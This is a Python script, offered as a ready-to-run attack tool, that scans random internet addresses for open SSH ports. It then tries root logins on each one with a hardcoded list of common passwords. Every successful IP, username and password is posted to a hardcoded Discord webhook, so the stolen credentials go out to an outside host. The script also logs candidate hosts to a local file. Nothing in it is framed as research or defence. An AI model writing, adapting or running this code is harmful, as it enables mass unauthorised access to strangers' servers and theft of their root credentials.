import random
import socket
import paramiko
import requests
import concurrent.futures
import ipaddress
import time
import os
import logging
from typing import List, Optional

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Constants
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1297304039624806410/MJWS6qTlSVmsDc7DNQ04cxCDZfPxDmmGNJlEVMFsgFnWGJFFcMpeVzyxm1Pl_dZtHHoa"
MAX_RETRIES = 8
SCAN_TIMEOUT = 1
SSH_TIMEOUT = 50
SSH_BANNER_TIMEOUT = 200
SSH_AUTH_TIMEOUT = 10
NUM_IPS_TO_SCAN = 5000
MAX_WORKERS = 500
BATCH_DELAY = 3

def generate_random_ip() -> str:
    return str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))

def scan_for_ubuntu(ip: str) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(SCAN_TIMEOUT)
            return sock.connect_ex((ip, 22)) == 0
    except socket.error:
        return False

def try_ssh_connection(ip: str, password: str, total_retry_count: int) -> Optional[bool]:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logger.info(f"Trying password: {password} for {ip}")
        ssh.connect(ip, username="root", password=password, timeout=SSH_TIMEOUT, 
                    banner_timeout=SSH_BANNER_TIMEOUT, auth_timeout=SSH_AUTH_TIMEOUT, compress=True)
        logger.info(f"Successfully connected to {ip} with password: {password}")
        send_discord_notification(f"@everyone \n [+] Successfully connected to:\nIP: {ip}\nUsername: root\nPassword: {password}")
        ssh.close()
        return True
    except paramiko.ssh_exception.AuthenticationException as e:
        if "Permission denied (publickey)" in str(e) or "Permission denied (publickey,gssapi-keyex,gssapi-with-mic)" in str(e):
            logger.warning(f"Skipping {ip}: Public key authentication required")
            return "skip"
        return False
    except paramiko.ssh_exception.SSHException as e:
        if "Error reading SSH protocol banner" in str(e):
            if total_retry_count < MAX_RETRIES:
                logger.warning(f"Error reading SSH protocol banner for {ip}. Retrying... (Attempt {total_retry_count + 1}/{MAX_RETRIES})")
                time.sleep(5)
                return None
            else:
                logger.warning(f"Skipping {ip} after {MAX_RETRIES} failed attempts")
                return "skip"
        elif any(msg in str(e) for msg in ["Permanently added", "Unable to negotiate"]):
            logger.warning(f"SSH negotiation failed for {ip}. Skipping...")
            return "skip"
    except (socket.error, paramiko.ssh_exception.NoValidConnectionsError) as e:
        logger.warning(f"Connection error for {ip}: {str(e)}. Skipping to next IP.")
        return "skip"
    except Exception as e:
        logger.error(f"Error for {ip}: Connection failed. {str(e)}")
        return False

def bruteforce_ssh(ip: str, passwords: List[str]) -> bool:
    total_retry_count = 0
    for password in passwords:
        result = try_ssh_connection(ip, password, total_retry_count)
        if result is True:
            return True
        elif result == "skip":
            return False
        elif result is False:
            continue
        elif result is None:
            total_retry_count += 1
            if total_retry_count >= MAX_RETRIES:
                logger.warning(f"Skipping {ip} after {MAX_RETRIES} failed attempts")
                return False
        time.sleep(2)
    
    if total_retry_count < MAX_RETRIES:
        with open("bruteforceable_ips.txt", "a") as f:
            f.write(f"{ip} - bruteforceable\n")
        logger.info(f"Added {ip} to bruteforceable_ips.txt")
    return False

def send_discord_notification(message: str) -> None:
    try:
        requests.post(WEBHOOK_URL, json={"content": message}, timeout=10)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to send Discord notification: {str(e)}")

def scan_ips(num_ips: int = NUM_IPS_TO_SCAN) -> List[str]:
    ips = [generate_random_ip() for _ in range(num_ips)]
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        results = list(executor.map(scan_for_ubuntu, ips))
    return [ip for ip, result in zip(ips, results) if result]

def main() -> None:
    common_passwords = [
        "password", "123456", "12345678", "root", "toor", "admin", "ubuntu", "password123",
        "qwerty", "letmein", "changeme", "secret", "1234", "admin123", "p@ssw0rd", "123123",
        "abc123", "test", "123", "1234567890", "password1", "12345", "123456789", "qwerty123",
        "1q2w3e4r", "ubuntu123", "root123", "000000", "system", "default"
    ]

    while True:
        found_ips = scan_ips()
        for ip in found_ips:
            try:
                logger.info(f"Ubuntu server found at {ip}")
                send_discord_notification(f"[+] Ubuntu server found at {ip}")
                result = bruteforce_ssh(ip, common_passwords)
                if result:
                    logger.info(f"Successfully connected to {ip}")
                else:
                    logger.info(f"Failed to connect to {ip}")
            except Exception as e:
                logger.error(f"An error occurred while processing {ip}: {str(e)}")
                continue
        else:
            logger.info("No Ubuntu servers found in this batch")
        time.sleep(BATCH_DELAY)

if __name__ == "__main__":
    os.system("title Ubuntu Bruteforce")
    main()